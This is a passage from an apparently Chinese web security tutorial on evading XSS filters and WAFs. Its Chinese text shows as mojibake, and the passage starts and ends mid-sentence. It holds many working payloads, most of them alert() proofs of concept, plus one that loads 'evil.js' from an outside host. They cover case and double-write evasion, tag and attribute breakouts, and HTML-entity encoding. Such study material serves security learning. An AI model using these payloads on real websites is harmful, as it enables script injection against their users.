href="#ç»•è¿‡å§¿åŠ¿" class="headerlink" title="ç»•è¿‡å§¿åŠ¿"></a>ç»•è¿‡å§¿åŠ¿</h1><h2 id="ç»•è¿‡ç©ºæ ¼"><a href="#ç»•è¿‡ç©ºæ ¼" class="headerlink" title="ç»•è¿‡ç©ºæ ¼"></a>ç»•è¿‡ç©ºæ ¼</h2><p>å½“ç©ºæ ¼è¢«è¿‡æ»¤äº†æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ <code>/</code> æ¥ä»£æ›¿ç©ºæ ¼ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;img/src=<span class="string">&quot;x&quot;</span>/onerror=<span class="title function_">alert</span>(<span class="number">1</span>);&gt;</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;img/src=<span class="string">&quot;x&quot;</span>onerror=<span class="title function_">alert</span>(<span class="number">1</span>);&gt;</span><br></pre></td></tr></table></figure><h2 id="ç»•è¿‡å¼•å·"><a href="#ç»•è¿‡å¼•å·" class="headerlink" title="ç»•è¿‡å¼•å·"></a>ç»•è¿‡å¼•å·</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="regexp">/xss/</span>)&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">`xss`</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://xxx/evil.js</span>&gt;</span></span> &lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="ç»•è¿‡æ‹¬å·"><a href="#ç»•è¿‡æ‹¬å·" class="headerlink" title="ç»•è¿‡æ‹¬å·"></a>ç»•è¿‡æ‹¬å·</h2><ul><li>throw</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;img src=x onerror=<span class="string">&quot;javascript:window.onerror=alert;throw 1&quot;</span>&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onmouseover</span>=<span class="string">&quot;javascript:window.onerror=alert;throw 1&gt;</span></span></span></span><br></pre></td></tr></table></figure><ul><li>åå¼•å·</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">alert</span>(<span class="number">1</span>) == alert<span class="string">`1`</span></span><br></pre></td></tr></table></figure><h2 id="ç»•è¿‡å…³é”®å­—è¿‡æ»¤"><a href="#ç»•è¿‡å…³é”®å­—è¿‡æ»¤" class="headerlink" title="ç»•è¿‡å…³é”®å­—è¿‡æ»¤"></a>ç»•è¿‡å…³é”®å­—è¿‡æ»¤</h2><h3 id="å¤§å°å†™ç»•è¿‡"><a href="#å¤§å°å†™ç»•è¿‡" class="headerlink" title="å¤§å°å†™ç»•è¿‡"></a>å¤§å°å†™ç»•è¿‡</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;sCRiPt&gt;<span class="title function_">alert</span>(<span class="number">1</span>);&lt;/sCrIpT&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">ImG</span> <span class="attr">sRc</span>=<span class="string">x</span> <span class="attr">onerRor</span>=<span class="string">alert(1);</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="åŒå†™ç»•è¿‡"><a href="#åŒå†™ç»•è¿‡" class="headerlink" title="åŒå†™ç»•è¿‡"></a>åŒå†™ç»•è¿‡</h3><p>æœ‰äº›wafå¯èƒ½ä¼šåªæ›¿æ¢ä¸€æ¬¡ä¸”æ˜¯æ›¿æ¢ä¸ºç©ºï¼Œè¿™ç§æƒ…å†µä¸‹æˆ‘ä»¬å¯ä»¥è€ƒè™‘åŒå†™å…³é”®å­—ç»•è¿‡</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;scrscriptipt&gt;<span class="title function_">alert</span>(<span class="number">1</span>);&lt;/scrscriptipt&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">imimgg</span> <span class="attr">srsrcc</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1);</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡"><a href="#å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡" class="headerlink" title="å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡"></a>å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡</h3><h4 id="åˆ©ç”¨eval-å‡½æ•°"><a href="#åˆ©ç”¨eval-å‡½æ•°" class="headerlink" title="åˆ©ç”¨eval()å‡½æ•°"></a>åˆ©ç”¨eval()å‡½æ•°</h4><p>ä¸PHPçš„eval()å‡½æ•°ç›¸åŒï¼ŒJavaScriptçš„eval()å‡½æ•°ä¹Ÿå¯ä»¥è®¡ç®— JavaScript å­—ç¬¦ä¸²ï¼Œå¹¶æŠŠå®ƒä½œä¸ºè„šæœ¬ä»£ç æ¥æ‰§è¡Œã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;x&quot;</span> onerror=<span class="string">&quot;a=&#x27;aler&#x27;;b=&#x27;t&#x27;;c=&#x27;(1)&#x27;;eval(a+b+c)&quot;</span>&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;a=`aler`;b=`t`;c=&#x27;(`xss`);&#x27;;eval(a+b+c)&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">// åœ¨jsä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨åå¼•å·ä»£æ›¿å•åŒå¼•å·</span></span><br></pre></td></tr></table></figure><h4 id="åˆ©ç”¨top"><a href="#åˆ©ç”¨top" class="headerlink" title="åˆ©ç”¨top"></a>åˆ©ç”¨top</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;top[&quot;al&quot;+&quot;ert&quot;](`xss`);&lt;/script&gt;</span><br><span class="line">&lt;script&gt;top[&quot;al&quot;+&quot;ert&quot;](&quot;xss&quot;);&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="è¾“å‡ºç‚¹æ€»ç»“"><a href="#è¾“å‡ºç‚¹æ€»ç»“" class="headerlink" title="è¾“å‡ºç‚¹æ€»ç»“"></a>è¾“å‡ºç‚¹æ€»ç»“</h2><p>WAFæœ€å¤§çš„é—®é¢˜ï¼Œåœ¨äºä¸çŸ¥é“è¾“å‡ºçš„ä½ç½®ï¼Œå¯¼è‡´æ”»å‡»è€…æ ¹æ®å…·ä½“ç¯å¢ƒä»¥åŠå…·ä½“è¾“å‡ºçš„æ ‡ç­¾ç±»å‹ä¾¿å¯ä»¥ç»•è¿‡ã€‚</p><h3 id="è¾“å‡ºåœ¨å±æ€§é‡Œ"><a href="#è¾“å‡ºåœ¨å±æ€§é‡Œ" class="headerlink" title="è¾“å‡ºåœ¨å±æ€§é‡Œ"></a>è¾“å‡ºåœ¨å±æ€§é‡Œ</h3><p>ä¾‹å¦‚è¾“å‡ºçš„ä½ç½®ä½äºvalueå±æ€§ä¸­ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input value=&quot;[è¾“å‡º]&quot; type=text&gt;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥é€‰æ‹©ç›´æ¥é—­åˆæ ‡ç­¾ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&gt;&lt;img src=x onerror=alert(1);&gt;</span><br><span class="line"></span><br><span class="line">// è¾“å‡ºåå¦‚ä¸‹:</span><br><span class="line">// &lt;input value=&quot;&quot;&gt;&lt;img src=x onerror=alert(1);&gt;&quot; type=text&gt;</span><br></pre></td></tr></table></figure><p>å¦‚æœ <code>&lt; &gt;</code> è¢«è¿‡æ»¤çš„è¯å¯ä»¥æ¢æˆé€‰æ‹©ä½¿ç”¨äº‹ä»¶æ¥é—­åˆå±æ€§ï¼Œå¹¶å°†åé¢çš„å¼•å·æ³¨é‡Šæ‰æˆ–é—­åˆï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot; autofocus onfocus=alert(1)//</span><br><span class="line">&quot; autofocus onfocus=alert(1) &quot;</span><br><span class="line"></span><br><span class="line">// è¾“å‡ºåå¦‚ä¸‹:</span><br><span class="line">// &lt;input value=&quot;&quot; autofocus onfocus=alert(1)//&quot; type=text&gt;</span><br></pre></td></tr></table></figure><p>åŒæ ·è¿˜æœ‰å¾ˆå¤šå…¶ä»–çš„payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot; onmouseover=prompt(0) x=&quot;</span><br><span class="line">&quot; onfocusin=alert(1) autofocus x=&quot;</span><br><span class="line">&quot; onfocusout=alert(1) autofocus x=&quot;</span><br><span class="line">&quot; onblur=alert(1) autofocus a=&quot;</span><br></pre></td></tr></table></figure><p>è¿˜æœ‰ä¸€äº›ç‰¹æ®Šçš„åœºæ™¯ï¼Œå¦‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input type=&quot;hidden&quot; value=&quot;[è¾“å‡º]&quot; /&gt;</span><br><span class="line">&lt;input value=&quot;[è¾“å‡ºç‚¹]&quot; type=&quot;hidden&quot;/&gt;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåªèƒ½æŠŠinputæ ‡ç­¾é—­åˆï¼Œç„¶åç›´æ¥æ‰§è¡Œè„šæœ¬ï¼Œå¦åˆ™ä¼šå› ä¸ºtypeä¸ºhiddenå¯¼è‡´æ— æ³•æ‰§è¡Œè„šæœ¬ã€‚</p><h3 id="è¾“å‡ºåœ¨HTMLæ ‡ç­¾ä¹‹é—´"><a href="#è¾“å‡ºåœ¨HTMLæ ‡ç­¾ä¹‹é—´" class="headerlink" title="è¾“å‡ºåœ¨HTMLæ ‡ç­¾ä¹‹é—´"></a>è¾“å‡ºåœ¨HTMLæ ‡ç­¾ä¹‹é—´</h3><p>ä¾‹å¦‚è¾“å‡ºçš„ä½ç½®å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div id=&quot;body&quot;&gt;[è¾“å‡º]&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>ç›´æ¥æäº¤ <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> å³å¯è§¦å‘XSSï¼Œä½†æ˜¯å½“æ ‡ç­¾æ˜¯ä¸èƒ½æ‰§è¡Œè„šæœ¬çš„æ ‡ç­¾æ—¶ï¼Œå¦‚ä¸‹é¢è¿™å‡ ä¸ªï¼š</p><ul><li><code>&lt;title&gt;&lt;/title&gt;</code></li><li><code>&lt;textarea&gt;&lt;/textarea&gt;</code></li><li><code>&lt;xmp&gt;&lt;/xmp&gt;</code></li><li><code>&lt;iframe&gt;&lt;/iframe&gt;</code></li></ul><p>é‚£ä¹ˆå°±å¾—å…ˆæŠŠé‚£ä¸ªæ ‡ç­¾é—­åˆï¼ˆåæ–‡ä¼šè®²åˆ°åŸç†ï¼‰ï¼Œç„¶ååœ¨æ³¨å…¥XSSè¯­å¥ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;/textarea&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="è¾“å‡ºåœ¨scriptæ ‡ç­¾ä¹‹é—´"><a href="#è¾“å‡ºåœ¨scriptæ ‡ç­¾ä¹‹é—´" class="headerlink" title="è¾“å‡ºåœ¨scriptæ ‡ç­¾ä¹‹é—´"></a>è¾“å‡ºåœ¨scriptæ ‡ç­¾ä¹‹é—´</h3><p>ä¾‹å¦‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    var x = &quot;input&quot;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>å¯æ§ä½ç½®åœ¨inputï¼Œå¯ä»¥é—­åˆscriptæ ‡ç­¾æ’å…¥ä»£ç ï¼Œä½†æ˜¯åŒæ ·æˆ‘ä»¬ä»…ä»…é—­åˆåŒå¼•å·å°±å¯ä»¥æ‰§è¡Œjsä»£ç äº†ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;;alert(1)//</span><br><span class="line"></span><br><span class="line">// è¾“å‡ºåå¦‚ä¸‹:</span><br><span class="line">// &lt;script&gt;var x = &quot;&quot;;alert(1)//&quot;;&lt;/script&gt;</span><br></pre></td></tr></table></figure><h1 id="å­—ç¬¦ç¼–ç ç»•è¿‡"><a href="#å­—ç¬¦ç¼–ç ç»•è¿‡" class="headerlink" title="å­—ç¬¦ç¼–ç ç»•è¿‡"></a>å­—ç¬¦ç¼–ç ç»•è¿‡</h1><p>åœ¨XSSä¸­ï¼Œè¿˜æœ‰ä¸€ä¸ªç»•è¿‡å…³é”®å­—è¿‡æ»¤çš„æ–¹æ³•ï¼Œé‚£å°±æ˜¯å­—ç¬¦ç¼–ç ç»•è¿‡ã€‚è¿™é‡Œç»™å‡ºä¸€ä¸ªç¼–ç ç½‘ç«™ï¼š<a href="https://bianma.bmcx.com/">https://bianma.bmcx.com/</a></p><p>ç¼–ç å±äºè®¡ç®—æœºç³»ç»Ÿçš„åŸºç¡€çŸ¥è¯†ï¼Œå…¶å†…å®¹å†™èµ·æ¥ä¼°è®¡ä¹Ÿå¯ä»¥å‡ºæœ¬ä¹¦äº†ï¼Œä¸è¿‡æˆ–å¤šæˆ–å°‘æˆ‘ä»¬éƒ½æœ‰æ‰€äº†è§£ï¼Œæ€»çš„æ¥è¯´ï¼Œç¼–ç å°±æ˜¯å°†å­—ç¬¦å˜ä¸ºäºŒè¿›åˆ¶æ•°ï¼Œè€Œè§£ç å°±æ˜¯å°†äºŒè¿›åˆ¶æ•°è¿˜åŸä¸ºå­—ç¬¦ã€‚ä»æµè§ˆå™¨è¯·æ±‚urlåˆ°åœ¨é¡µé¢ä¸Šæ˜¾ç¤ºå‡ºæ¥ä¹Ÿç»å†äº†ä¸€äº›ç¼–ç å’Œè§£ç è¿‡ç¨‹ï¼Œä¸‹é¢å¤§æ¦‚ä»‹ç»ä¸€ä¸‹æµç¨‹ã€‚</p><h2 id="è¯·æ±‚ç½‘é¡µè§£ç æµç¨‹"><a href="#è¯·æ±‚ç½‘é¡µè§£ç æµç¨‹" class="headerlink" title="è¯·æ±‚ç½‘é¡µè§£ç æµç¨‹"></a>è¯·æ±‚ç½‘é¡µè§£ç æµç¨‹</h2><ul><li><strong>HTML ç¼–ç &#x2F;è§£ç </strong></li></ul><p>å½“æµè§ˆå™¨æ¥æ”¶åˆ°æœåŠ¡ç«¯å‘é€æ¥çš„äºŒè¿›åˆ¶æ•°æ®åï¼Œé¦–å…ˆä¼šå¯¹å…¶è¿›è¡ŒHTMLè§£ç ï¼Œå‘ˆç°å‡ºæ¥çš„å°±æ˜¯æˆ‘ä»¬çœ‹åˆ°çš„æºä»£ç ã€‚å…·ä½“çš„è§£ç æ–¹å¼ä¾å…·ä½“æƒ…å†µè€Œå®šï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨é¡µé¢ä¸­æŒ‡å®šç¼–ç ï¼Œé˜²æ­¢æµè§ˆå™¨æŒ‰ç…§é”™è¯¯çš„æ–¹å¼è§£ç ï¼Œé€ æˆä¹±ç ã€‚</p><p>ä½†æ˜¯åœ¨HTMLä¸­æœ‰äº›å­—ç¬¦æ˜¯å’Œå…³é”®è¯å†²çªçš„ï¼Œæ¯”å¦‚ <code>&lt;</code>ã€<code>&gt;</code>ã€<code>&amp;</code>ï¼Œè§£ç ä¹‹åï¼Œæµè§ˆå™¨ä¼šè¯¯è®¤ä¸ºå®ƒä»¬æ˜¯HTMLæ ‡ç­¾ï¼Œå¦‚æœå¸Œæœ›æ­£ç¡®åœ°æ˜¾ç¤ºé¢„ç•™å­—ç¬¦ï¼Œå°±éœ€è¦åœ¨HTMLä¸­ä½¿ç”¨å¯¹åº”çš„HTMLå­—ç¬¦å®ä½“ã€‚</p><p>å­—ç¬¦å®ä½“æ˜¯ä¸€ä¸ªè½¬ä¹‰åºåˆ—ï¼Œå®ƒå®šä¹‰äº†ä¸€èˆ¬æ— æ³•åœ¨æ–‡æœ¬å†…å®¹ä¸­è¾“å…¥çš„å•ä¸ªå­—ç¬¦æˆ–ç¬¦å·ã€‚ä¸€ä¸ªå­—ç¬¦å®ä½“ä»¥ä¸€ä¸ª&amp;ç¬¦å·å¼€å¤´ï¼Œåé¢è·Ÿç€ä¸€ä¸ªé¢„å®šä¹‰çš„å®ä½“çš„åç§°ï¼Œæˆ–ç”¨&amp;#å¼€å¤´+å®ä½“ç¼–å·+åˆ†å·æ¥è¡¨ç¤ºã€‚</p><p>å¸¸è§çš„HTMLå­—ç¬¦å®ä½“æœ‰ï¼š</p><table><thead><tr><th>æ˜¾ç¤ºç»“æœ</th><th>æè¿°</th><th>å®ä½“åç§°</th><th>å®ä½“ç¼–å·</th></tr></thead><tbody><tr><td></td><td>ç©ºæ ¼</td><td><code> </code></td><td><code> </code></td></tr><tr><td>&lt;</td><td>å°äºå·</td><td><code>&lt;</code></td><td><code>&lt;</code></td></tr><tr><td>&gt;</td><td>å¤§äºå·</td><td><code>&gt;</code></td><td><code>&gt;</code></td></tr><tr><td>&amp;</td><td>å’Œå·</td><td><code>&amp;</code></td><td><code>&amp;</code></td></tr><tr><td>â€œ</td><td>å¼•å·</td><td><code>&quot;</code></td><td><code>&quot;</code></td></tr><tr><td>â€˜</td><td>æ’‡å·</td><td><code>&#39;</code>(IEä¸æ”¯æŒ)</td><td><code>&#39;</code></td></tr></tbody></table><p>ä½†å¹¶ä¸æ˜¯æ‰€æœ‰çš„å­—ç¬¦éƒ½æœ‰å®ä½“åç§°ï¼Œä½†æ˜¯å®ƒä»¬éƒ½æœ‰è‡ªå·±çš„å®ä½“ç¼–å·ã€‚</p><p>ä¸€ä¸ªHTMLè§£æå™¨ä½œä¸ºä¸€ä¸ªçŠ¶æ€æœºï¼Œå®ƒä»è¾“å…¥æµä¸­è·å–å­—ç¬¦å¹¶æŒ‰ç…§è½¬æ¢è§„åˆ™è½¬æ¢åˆ°å¦ä¸€ç§çŠ¶æ€ã€‚åœ¨è§£æè¿‡ç¨‹ä¸­ï¼Œä»»ä½•æ—¶å€™å®ƒåªè¦é‡åˆ°ä¸€ä¸ª <code>&lt;</code> ç¬¦å·ï¼ˆåé¢æ²¡æœ‰è·Ÿ <code>/</code>ç¬¦å·ï¼‰å°±ä¼šè¿›å…¥ <strong>æ ‡ç­¾å¼€å§‹çŠ¶æ€(Tag open state)</strong> ï¼Œç„¶åè½¬å˜åˆ° <strong>æ ‡ç­¾åçŠ¶æ€(Tag name state)</strong> ã€ <strong>å‰å±æ€§åçŠ¶æ€(before attribute name state)</strong> â€¦â€¦æœ€åè¿›å…¥ <strong>æ•°æ®çŠ¶æ€(Data state)</strong> å¹¶é‡Šæ”¾å½“å‰æ ‡ç­¾çš„tokenã€‚å½“è§£æå™¨å¤„äº æ•°æ®çŠ¶æ€(Data state) æ—¶ï¼Œå®ƒä¼šç»§ç»­è§£æï¼Œæ¯å½“å‘ç°ä¸€ä¸ªå®Œæ•´çš„æ ‡ç­¾ï¼Œå°±ä¼šé‡Šæ”¾å‡ºä¸€ä¸ªtokenã€‚</p><p>ç®€å•çš„è¯´å°±æ˜¯ï¼Œæµè§ˆå™¨å¯¹HTMLè§£ç ä¹‹åå°±å¼€å§‹è§£æHTMLæ–‡æ¡£ï¼Œå°†ä¼—å¤šæ ‡ç­¾è½¬åŒ–ä¸ºå†…å®¹æ ‘ä¸­çš„DOMèŠ‚ç‚¹ï¼Œæ­¤æ—¶è¯†åˆ«æ ‡ç­¾çš„æ—¶å€™ï¼ŒHTMLè§£æå™¨æ˜¯æ— æ³•è¯†åˆ«é‚£äº›è¢«å®ä½“ç¼–ç çš„å†…å®¹çš„ï¼Œåªæœ‰å»ºç«‹èµ·DOMæ ‘ï¼Œæ‰èƒ½å¯¹æ¯ä¸ªèŠ‚ç‚¹çš„å†…å®¹è¿›è¡Œè¯†åˆ«ï¼Œå¦‚æœå‡ºç°å®ä½“ç¼–ç ï¼Œåˆ™ä¼šè¿›è¡Œå®ä½“è§£ç ï¼Œåªè¦æ˜¯DOMèŠ‚ç‚¹é‡Œå±æ€§çš„å€¼ï¼Œéƒ½å¯ä»¥è¢«HTMLç¼–ç å’Œè§£æã€‚</p><p>æ‰€ä»¥åœ¨PHPä¸­ï¼Œä½¿ç”¨htmlspecialchars()å‡½æ•°æŠŠé¢„å®šä¹‰çš„å­—ç¬¦è½¬æ¢ä¸ºHTMLå®ä½“ï¼Œåªæœ‰ç­‰åˆ°DOMæ ‘å»ºç«‹èµ·æ¥åï¼Œæ‰ä¼šè§£æHTMLå®ä½“ï¼Œèµ·åˆ°äº†XSSé˜²æŠ¤ä½œç”¨ã€‚</p><ul><li><strong>URL è§£ç </strong></li></ul><p>URLç¼–ç æ˜¯ä¸ºäº†å…è®¸URLä¸­å­˜åœ¨æ±‰å­—è¿™æ ·çš„éæ ‡å‡†å­—ç¬¦ï¼Œæœ¬è´¨æ˜¯æŠŠä¸€ä¸ªå­—ç¬¦è½¬ä¸º%åŠ ä¸ŠUTF-8ç¼–ç å¯¹åº”çš„16è¿›åˆ¶æ•°å­—ã€‚æ‰€ä»¥åˆç§°ä¹‹ä¸ºPercent-encodingã€‚</p><p>åœ¨æœåŠ¡ç«¯æ¥æ”¶åˆ°è¯·æ±‚æ—¶ï¼Œä¼šè‡ªåŠ¨å¯¹è¯·æ±‚è¿›è¡Œä¸€æ¬¡URLè§£ç ã€‚</p><ul><li><strong>JavaScript è§£ç ï¼ˆåªæ”¯æŒUnicodeï¼‰</strong></li></ul><p>å½“HTMLè§£æäº§ç”ŸDOMèŠ‚ç‚¹åï¼Œä¼šæ ¹æ®DOMèŠ‚ç‚¹æ¥åšæ¥ä¸‹æ¥çš„è§£æå·¥ä½œï¼Œæ¯”å¦‚åœ¨å¤„ç†è¯¸å¦‚ <code>&lt;script&gt;</code>ã€<code>&lt;style&gt;</code> è¿™æ ·çš„æ ‡ç­¾æ—¶ï¼Œè§£æå™¨ä¼šè‡ªåŠ¨åˆ‡æ¢åˆ°JavaScriptè§£ææ¨¡å¼ï¼Œè€Œ <code>src</code>ã€ <code>href</code> åè¾¹åŠ å…¥çš„ javascript ä¼ªURLï¼Œä¹Ÿä¼šè¿›å…¥ JavaScript çš„è§£ææ¨¡å¼ã€‚</p><p>æ¯”å¦‚ <code>&lt;a href=&quot;javascript:alert(&#39;\u0031&#39;)&quot;&gt;test&lt;/a&gt;</code>ï¼ŒJavaScript å‡ºå‘äº† JavaScript è§£é‡Šå™¨ï¼ŒJavaScript ä¼šå…ˆå¯¹å†…å®¹è¿›è¡Œè§£æï¼Œé‡Œè¾¹æœ‰ä¸€ä¸ªè½¬ä¹‰å­—ç¬¦<code>\u0031</code>ï¼Œå‰å¯¼çš„ u è¡¨ç¤ºä»–æ˜¯ä¸€ä¸ªunicode å­—ç¬¦ï¼Œæ ¹æ®åè¾¹çš„æ•°å­—ï¼Œè§£æä¸ºâ€œ1â€ï¼Œäºæ˜¯åœ¨å®Œæˆ JavaScript çš„è§£æä¹‹åå˜æˆäº† <code>&lt;a href=&quot;javascript:alert(&#39;1&#39;)&quot;&gt;test&lt;/a&gt;</code>ã€‚</p><p><strong>ä¸‹é¢ç”¨ä¸€ä¸ªæ™®é€šçš„XSSä»£ç æ¥è¯´æ˜ä¸€ä¸‹æµè§ˆå™¨å¯¹å…¶è§£æçš„è¿‡ç¨‹ã€‚</strong></p><ul><li><code>&lt;a href=&quot;javascript:alert(&#39;xss&#39;)&quot;&gt;test&lt;/a&gt;</code></li></ul><p>é¦–å…ˆHTMLè§£æå™¨å¼€å§‹å·¥ä½œï¼Œå¹¶å¯¹hrefä¸­çš„å­—ç¬¦åšHTMLè§£ç ï¼Œæ¥ä¸‹æ¥URLè§£æå™¨å¯¹hrefå€¼è¿›è¡Œè§£ç ï¼Œæ­£å¸¸æƒ…å†µä¸‹URLå€¼ä¸ºä¸€ä¸ªæ­£å¸¸çš„URLé“¾æ¥ï¼Œå¦‚ï¼š<code>https://www.baidu.com</code>ï¼Œé‚£ä¹ˆURLè§£æå™¨å·¥ä½œå®Œæˆåæ˜¯ä¸éœ€è¦å…¶ä»–è§£ç çš„ï¼Œä½†æ˜¯è¯¥ç¯å¢ƒä¸­URLèµ„æºç±»å‹ä¸ºJavascriptï¼Œå› æ­¤è¯¥ç¯å¢ƒä¸­æœ€åä¸€æ­¥Javascriptè§£æå™¨è¿˜ä¼šè¿›è¡Œè§£ç æ“ä½œï¼Œæœ€åè§£æçš„è„šæœ¬å°†è¢«æ‰§è¡Œã€‚</p><p>æ•´ä¸ªè§£æé¡ºåºä¸º3ä¸ªç¯èŠ‚ï¼šHTMLè§£ç  â€”&gt;URLè§£ç  â€”&gt;JSè§£ç </p><p>æˆ‘ä»¬å¯ä»¥å¯¹XSSæ”»å‡»å‘é‡åšè¿™ä¸‰ç§ç¼–ç éƒ½å¯ä»¥æˆåŠŸå¼¹æ¡†ã€‚</p><h2 id="HTML-å®ä½“ç¼–ç "><a href="#HTML-å®ä½“ç¼–ç " class="headerlink" title="HTML å®ä½“ç¼–ç "></a>HTML å®ä½“ç¼–ç </h2><p>æˆ‘ä»¬å¯ä»¥å°†DOMèŠ‚ç‚¹ä¸­çš„å†…å®¹è½¬åŒ–ä¸ºHTMLå®ä½“ï¼Œå› ä¸ºè§£æHTMLä¹‹åå»ºç«‹èµ·èŠ‚ç‚¹ï¼Œç„¶åä¼šå¯¹DOMèŠ‚ç‚¹é‡Œé¢çš„HTMLå®ä½“è¿›è¡Œè§£æã€‚HTML ç¼–ç ä¸»è¦åˆ†ä¸º10è¿›åˆ¶å’Œ16è¿›åˆ¶ï¼Œæ ¼å¼ä¸ºä»¥ <code>&amp;#</code> å¼€å¤´ä»¥åˆ†å· <code>;</code> ç»“å°¾ï¼ˆä¹Ÿå¯ä»¥ä¸å¸¦åˆ†å·ï¼‰ã€‚</p><ul><li><code>&lt;a href=javascript:alert(&quot;xss&quot;)&gt;test&lt;/a&gt;</code></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// åè¿›åˆ¶</span><br><span class="line">&lt;a href=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&gt;test&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">// åå…­è¿›åˆ¶</span><br><span class="line">&lt;a href=&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x22;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x22;&amp;#x29;&gt;test&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">// ä¹Ÿå¯ä»¥ä¸å¸¦åˆ†å·</span><br><span class="line">&lt;a href=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x22&amp;#x78&amp;#x73&amp;#x73&amp;#x22&amp;#x29&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure><ul><li><code>&lt;img src=x onerror=alert(&quot;xss&quot;)&gt;</code></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// åè¿›åˆ¶</span><br><span class="line">&lt;img src=x onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&gt;</span><br><span class="line"></span><br><span class="line">// åå…­è¿›åˆ¶</span><br><span class="line">&lt;img src=x onerror=&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x22;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x22;&amp;#x29;&gt;</span><br><span class="line"></span><br><span class="line">// ä¹Ÿå¯ä»¥ä¸å¸¦åˆ†å·</span><br><span class="line">&lt;img src=x onerror=&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x22&amp;#x78&amp;#x73&amp;#x73&amp;#x22&amp;#x29&gt;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¦æ³¨æ„ï¼Œå¯¹äºHTMLå­—ç¬¦å®ä½“ï¼Œå¹¶ä¸æ˜¯è¯´ä»»ä½•åœ°æ–¹éƒ½å¯ä»¥ä½¿ç”¨å®ä½“ç¼–ç ï¼Œåªæœ‰å¤„äº 